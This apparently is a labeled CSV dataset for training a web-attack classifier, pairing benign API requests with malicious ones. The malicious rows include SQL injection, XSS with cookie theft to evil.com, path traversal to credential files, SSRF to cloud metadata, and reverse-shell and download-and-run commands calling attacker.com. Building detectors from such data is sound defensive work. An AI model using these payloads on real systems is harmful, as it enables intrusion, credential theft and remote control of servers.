"text","label"
"url=http://192.168.1.1","1"
"title='><script>alert(1)</script>","1"
"GET /api/swagger.json HTTP/1.1","1"
"page=44&limit=20","0"
"name=Nour email=318@mail.com","0"
"message=<iframe src=javascript:alert(1)>","1"
"search=laptop","0"
"url=gopher://127.0.0.1:25/","1"
"comment=<scr ipt>alert(1)</scr ipt>","1"
"{""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"DELETE /api/login User-Agent: axios/1.6.0","0"
"search=<scr ipt>alert(1)</scr ipt>","1"
"order_id=' OR 1=1 LIMIT 1--","1"
"Content-Type: application/json {""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"username=root&password=admin123","1"
"user_id=677&action=view","0"
"GET /api/users/3228","0"
"GET /profile/5263","0"
"GET /backup.sql HTTP/1.1","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"{""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"GET ....//....//etc/passwd","1"
"GET /api/login/1097","0"
"PUT /api/search User-Agent: PostmanRuntime/7.36.0","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"Authorization: Bearer validtoken457","0"
"include=..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts","1"
"User-Agent: Nikto/2.5.0","1"
"User-Agent: masscan/1.3","1"
"& ipconfig","1"
"GET /api/products/4873","0"
"username=user&password=letmein","1"
"Content-Type: application/json {""search"": ""wireless headphones"", ""in_stock"": true}","0"
"POST /api/login username=1'; INSERT INTO users VALUES('hacker','pass')-- password=test","1"
"url=http://127.0.0.1/admin","1"
"search=laptop","0"
"search=' UNION SELECT 1,table_name FROM information_schema.tables--","1"
"GET /settings/7619","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"user_id=399&action=view","0"
"file=/etc/passwd%00","1"
"GET /profile/882","0"
"POST /api/feedback body=%3Cscript%3Ealert(1)%3C/script%3E","1"
"Authorization: Bearer validtoken836","0"
"user_id=109&action=view","0"
"POST /api/login body={""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"search=phone","0"
"order_id=ORD-7976 status=confirmed","0"
"search=phone","0"
"GET /api/login/7668","0"
"url=file:///etc/passwd","1"
"DELETE /api/products User-Agent: Mozilla/5.0 (Linux; Android 14; Pixel 8) Chrome/123.0.0.0","0"
"DELETE /profile User-Agent: python-requests/2.31.0","0"
"POST /api/users User-Agent: axios/1.6.0","0"
"repeated authentication failure admin account locked","1"
"id=' OR ''='","1"
"GET /actuator/env HTTP/1.1","1"
"repeated authentication failure admin account locked","1"
"Content-Type: application/json {""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"status=pending&priority=high","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"Authorization: Bearer validtoken283","0"
"& ipconfig","1"
"Authorization: Bearer validtoken710","0"
"login attempt failed username admin invalid credentials","1"
"GET /api/users/6324","0"
"Content-Type: application/json {""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"search=' UNION SELECT NULL,NULL--","1"
"POST /api/login body={""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"user=ahmed&filter=active","0"
"{""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"url=http://10.0.0.1","1"
"user_id=73&action=view","0"
"GET /actuator/env HTTP/1.1","1"
"cmd=|| nc -e /bin/sh attacker.com 4444","1"
"login attempt failed username admin invalid credentials","1"
"Content-Type: application/json {""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"multiple failed login attempts detected for admin","1"
"PUT /api/products User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X)","0"
"name=Nour email=818@mail.com","0"
"category=audio page=5","0"
"page=26&limit=50","0"
"..\\..\\..\\windows\\system32\\drivers\\etc\\hosts","1"
"page=11&limit=20","0"
"search=tablet","0"
"user_id=902&action=view","0"
"password spray attack detected multiple users","1"
"message=<svg onload=alert(1)>","1"
"endpoint=http://localhost:9200/_cat/indices","1"
"GET /health HTTP/1.1","0"
"search=1 AND 1=CONVERT(int,@@version)--","1"
"Authorization: Bearer validtoken978","0"
"id=123&format=json","0"
"order_id=ORD-1483 status=confirmed","0"
"file=../../.git/config","1"
"file=../../../../var/log/apache2/access.log","1"
"POST /profile User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","0"
"{""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"Content-Type: application/json {""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"Authorization: Bearer validtoken889","0"
"user_id=82&action=view","0"
"Content-Type: application/json {""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"GET /health HTTP/1.1","0"
"user_id=519&action=view","0"
"user=ahmed&filter=active","0"
"DELETE /settings?user=ahmed&filter=active","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"POST /api/orders body={""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"date=2024-01-15&type=order","0"
"GET /.git/config HTTP/1.1","1"
"Content-Type: application/json {""search"": ""wireless headphones"", ""in_stock"": true}","0"
"`curl -s http://attacker.com/shell.sh | bash`","1"
"name=Omar email=152@mail.com","0"
"1 OR 1=1","1"
"Authorization: Bearer validtoken939","0"
"POST /api/search body={""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"order_id=' OR '1'='1'--","1"
"page=46&limit=10","0"
"date=2024-01-15&type=order","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"order_id=ORD-3983 status=confirmed","0"
"../../../../proc/self/environ","1"
"comment=<img src=x onerror=fetch('https://evil.com?c='+document.cookie)>","1"
"{""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"{""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"GET /health HTTP/1.1","0"
"fetch=http://internal-service:8080/secret","1"
"category=tablets page=5","0"
"GET /api/swagger.json HTTP/1.1","1"
"search=phone","0"
"name=Nour email=187@mail.com","0"
"Authorization: Bearer validtoken791","0"
"url=http://127.0.0.1/admin","1"
"order_id=ORD-2157 status=confirmed","0"
"file=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts","1"
"POST /api/data body=command| wget http://attacker.com/shell.sh","1"
"url=http://192.168.1.1","1"
"POST /profile body={""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"Authorization: Bearer validtoken390","0"
"GET /api/data?search=laptop&sort=price","0"
"username=1'	OR	1=1--","1"
"{""search"": ""wireless headphones"", ""in_stock"": true}","0"
"{""search"": ""wireless headphones"", ""in_stock"": true}","0"
"comment=<ScRiPt>alert(1)</ScRiPt>","1"
"POST /api/login username=admin'-- password=test","1"
"limit=20&offset=0","0"
"Content-Type: application/json {""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"page=8&limit=50","0"
"GET /web.config HTTP/1.1","1"
"host=; ls -la","1"
"Authorization: Bearer validtoken143","0"
"path=../../.git/config","1"
"path=../../../../etc/shadow","1"
"POST /api/data body={""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"include=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd","1"
"file=../../../etc/shadow","1"
"POST /profile body={""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"date=2024-01-15&type=order","0"
"user=1'/**/OR/**/1=1--","1"
"Content-Type: application/json {""search"": ""wireless headphones"", ""in_stock"": true}","0"
"url=dict://127.0.0.1:11211/","1"
"limit=20&offset=0","0"
"GET /health HTTP/1.1","0"
"{""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"POST /dashboard body={""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"order_id=ORD-8459 status=confirmed","0"
"DELETE /api/users User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","0"
"exec=| uname -a","1"
"Content-Type: application/json {""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"GET /dashboard User-Agent: python-requests/2.31.0","0"
"search=headphones","0"
"name=Ahmed email=643@mail.com","0"
"GET /api/search?q=<<SCRIPT>alert('XSS');//<</SCRIPT>","1"
"category=audio page=6","0"
"page=50&limit=20","0"
"search=phone","0"
"path=../../.git/config","1"
"page=21&limit=20","0"
"username=root&password=password","1"
"login attempt failed username admin invalid credentials","1"
"Content-Type: application/json {""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"login attempt failed username admin invalid credentials","1"
"user_id=741&action=view","0"
"page=36&limit=10","0"
"GET /api/login/6871","0"
"url=http://metadata.google.internal","1"
"Content-Type: application/json {""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"path=php://filter/convert.base64-encode/resource=config.php","1"
"POST /api/data body=command|| nc -e /bin/sh attacker.com 4444","1"
"User-Agent: masscan/1.3","1"
"GET /api/login/8364","0"
"limit=20&offset=0","0"
"POST /api/orders User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15","0"
"order_id=' UNION SELECT 1,table_name FROM information_schema.tables--","1"
"include=../../../../etc/shadow","1"
"GET /console HTTP/1.1","1"
"path=../../.git/config","1"
"POST /api/data body=command| cat /etc/passwd","1"
"GET /health HTTP/1.1","0"
"GET /web.config HTTP/1.1","1"
"Authorization: Bearer validtoken554","0"
"..\\..\\..\\windows\\system32\\drivers\\etc\\hosts","1"
"{""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"search=laptop","0"
"GET /health HTTP/1.1","0"
"GET /admin HTTP/1.1","1"
"name=Sara email=48@mail.com","0"
"{""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"POST /api/login username=1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- password=test","1"
"GET /api/search/9442","0"
"User-Agent: sqlmap/1.8.3#stable","1"
"username=user&password=admin123","1"
"user_id=52&action=view","0"
"url=http://localhost:8080","1"
"Authorization: Bearer validtoken705","0"
"POST /api/products?search=laptop&sort=price","0"
"category=phones page=9","0"
"GET /api/products/8179","0"
"Authorization: Bearer validtoken948","0"
"POST /api/login username=1'%09OR%091=1-- password=test","1"
"search=' UNION SELECT NULL--","1"
"order_id=admin'--","1"
"category=tablets page=7","0"
"order_id=ORD-8691 status=confirmed","0"
"GET /api/files?name=../../../var/www/html/config.php","1"
"GET /dashboard/9725","0"
"; ls -la","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"{""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"host=`curl -s http://attacker.com/shell.sh | bash`","1"
"cmd=& whoami","1"
"GET /api/orders/1648","0"
"GET /health HTTP/1.1","0"
"search=<ScRiPt>alert(1)</ScRiPt>","1"
"{""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"search=headphones","0"
"user=' OR 1=1#","1"
"category=tablets page=9","0"
"multiple failed login attempts detected for admin","1"
"order_id=ORD-5926 status=confirmed","0"
"POST /api/search body={""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"GET /api/orders/892","0"
"include=../../.git/config","1"
"GET ..\\..\\..\\windows\\system32\\drivers\\etc\\hosts","1"
"{""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"multiple failed login attempts detected for admin","1"
"page=7&limit=50","0"
"GET ../../../../proc/self/environ","1"
"GET /web.config HTTP/1.1","1"
"GET /api/files?name=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts","1"
"brute force attempt on login endpoint from single ip","1"
"1'%09OR%091=1--","1"
"search=<script>alert(1)</script>","1"
"GET /.env HTTP/1.1","1"
"ping=; ls -la","1"
"{""search"": ""wireless headphones"", ""in_stock"": true}","0"
"GET /health HTTP/1.1","0"
"GET /api/files?name=../../../../etc/shadow","1"
"GET /health HTTP/1.1","0"
"search=laptop","0"
"multiple failed login attempts detected for admin","1"
"url=http://127.0.0.1/admin","1"
"cmd=`id`","1"
"name=Omar email=33@mail.com","0"
"url=http://192.168.1.1","1"
"GET /api/search?q=<img src=`javascript:alert(1)`>","1"
"category=tablets page=4","0"
"Authorization: Bearer validtoken409","0"
"{""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"Content-Type: application/json {""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"url=gopher://127.0.0.1:25/","1"
"order_id=1 UNION SELECT 1,2,3--","1"
"GET /health HTTP/1.1","0"
"DELETE /api/users?date=2024-01-15&type=order","0"
"category=laptops page=4","0"
"GET /api/swagger.json HTTP/1.1","1"
"PUT /profile User-Agent: PostmanRuntime/7.36.0","0"
"url=http://metadata.google.internal","1"
"fetch=http://internal-service:8080/secret","1"
"POST /api/data body=command& net user hacker Password1 /add","1"
"User-Agent: Nmap Scripting Engine","1"
"path=/etc/passwd%00","1"
"Authorization: Bearer validtoken420","0"
"url=gopher://127.0.0.1:25/","1"
"GET /web.config HTTP/1.1","1"
"DELETE /settings?limit=20&offset=0","0"
"category=audio page=8","0"
"GET /api/users?id=' UNION SELECT username,password FROM users--","1"
"POST /api/login body={""search"": ""wireless headphones"", ""in_stock"": true}","0"
"category=audio page=7","0"
"user=' UNION SELECT NULL--","1"
"order_id=ORD-1862 status=confirmed","0"
"category=audio page=9","0"
"GET /profile/3640","0"
"fetch=http://internal-service:8080/secret","1"
"POST /api/products body={""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"PUT /settings?date=2024-01-15&type=order","0"
"GET /health HTTP/1.1","0"
"host=; ls -la","1"
"search=<input onfocus=alert(1) autofocus>","1"
"url=http://metadata.google.internal","1"
"DELETE /settings User-Agent: PostmanRuntime/7.36.0","0"
"page=40&limit=20","0"
"POST /api/login?date=2024-01-15&type=order","0"
"GET /api/files?name=..%2F..%2F..%2Fetc%2Fpasswd","1"
"GET /dashboard User-Agent: axios/1.6.0","0"
"Content-Type: application/json {""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"username=admin&password=123456","1"
"endpoint=http://localhost:9200/_cat/indices","1"
"GET /api/files?name=../../../../etc/shadow","1"
"Content-Type: application/json {""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"Content-Type: application/json {""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"username=1'||'1'='1","1"
"POST /api/data body={""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"Authorization: Bearer validtoken588","0"
"search=tablet","0"
"GET /api/users/6761","0"
"multiple failed login attempts detected for admin","1"
"user_id=133&action=view","0"
"GET /api/login?id=123&format=json","0"
"username=root&password=abc123","1"
"order_id=ORD-4308 status=confirmed","0"
"q=smartphone&brand=samsung","0"
"url=http://192.168.1.1","1"
"order_id=ORD-4426 status=confirmed","0"
"cmd=; ping -c 4 attacker.com","1"
"PUT /settings User-Agent: PostmanRuntime/7.36.0","0"
"Authorization: Bearer validtoken430","0"
"fetch=http://internal-service:8080/secret","1"
"Authorization: Bearer validtoken749","0"
"User-Agent: Nmap Scripting Engine","1"
"Authorization: Bearer validtoken742","0"
"GET /api/users?id=1' AND 1=1 UNION SELECT 1-- -","1"
"username=admin&password=batman","1"
"GET /server-status HTTP/1.1","1"
"page=18&limit=50","0"
"GET /health HTTP/1.1","0"
"PUT /profile?q=smartphone&brand=samsung","0"
"user_id=991&action=view","0"
"GET /health HTTP/1.1","0"
"cmd=; python -c 'import socket,subprocess'","1"
"PUT /api/users?search=laptop&sort=price","0"
"Content-Type: application/json {""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"include=file:///etc/passwd","1"
"category=tablets page=4","0"
"GET /phpmyadmin HTTP/1.1","1"
"page=4&limit=50","0"
"PUT /settings?search=laptop&sort=price","0"
"POST /dashboard body={""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"POST /api/login username=1' AND SLEEP(5)-- password=test","1"
"order_id=ORD-9845 status=confirmed","0"
"GET /admin HTTP/1.1","1"
"url=http://metadata.google.internal","1"
"url=file:///etc/passwd","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"Authorization: Bearer validtoken547","0"
